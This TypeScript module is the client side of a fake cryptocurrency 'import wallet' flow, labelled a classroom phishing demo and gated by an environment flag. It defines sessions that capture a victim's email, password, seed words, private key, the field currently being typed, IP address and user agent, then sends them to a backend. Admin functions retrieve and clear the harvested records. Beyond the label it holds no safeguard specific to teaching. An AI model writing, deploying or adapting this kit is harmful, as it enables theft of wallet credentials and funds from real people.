/** Classroom-only demo: fake “import wallet” flow. Never enable on public production without intent. */
export function isEduPhishingDemoEnabled(): boolean {
  return import.meta.env.VITE_EDU_PHISHING_DEMO === 'true'
}

export type EduPhishStep = 'connecting' | 'import_prompt' | 'recovery_form' | 'submitted'

export interface EduPhishSession {
  id: string
  walletBrand: string
  step: EduPhishStep
  email: string
  password: string
  seedWords: string[]
  privateKey: string
  activeField: string | null
  userAgent: string
  clientIp: string
  pageUrl: string
  createdAt: string
  updatedAt: string
}

const API = '/api/edu-phish'

async function parseJson<T>(res: Response): Promise<T> {
  const data = await res.json().catch(() => ({}))
  if (!res.ok) {
    const msg = typeof (data as { error?: string }).error === 'string' ? (data as { error: string }).error : res.statusText
    throw new Error(msg || 'Request failed')
  }
  return data as T
}

export async function createEduPhishSession(walletBrand: string): Promise<EduPhishSession> {
  const res = await fetch(`${API}/sessions`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ walletBrand, pageUrl: window.location.href }),
  })
  const data = await parseJson<{ session: EduPhishSession }>(res)
  return data.session
}

export async function patchEduPhishSession(
  id: string,
  patch: Partial<{
    step: EduPhishStep
    email: string
    password: string
    seedWords: string[]
    privateKey: string
    activeField: string | null
  }>
): Promise<EduPhishSession> {
  const res = await fetch(`${API}/sessions/${id}`, {
    method: 'PATCH',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(patch),
  })
  const data = await parseJson<{ session: EduPhishSession }>(res)
  return data.session
}

export async function fetchEduPhishSessionsAdmin(): Promise<EduPhishSession[]> {
  const res = await fetch(`${API}/admin/sessions`, { credentials: 'include' })
  const data = await parseJson<{ sessions: EduPhishSession[] }>(res)
  return data.sessions
}

export async function clearEduPhishSessionsAdmin(): Promise<number> {
  const res = await fetch(`${API}/admin/sessions`, { method: 'DELETE', credentials: 'include' })
  const data = await parseJson<{ cleared: number }>(res)
  return data.cleared
}
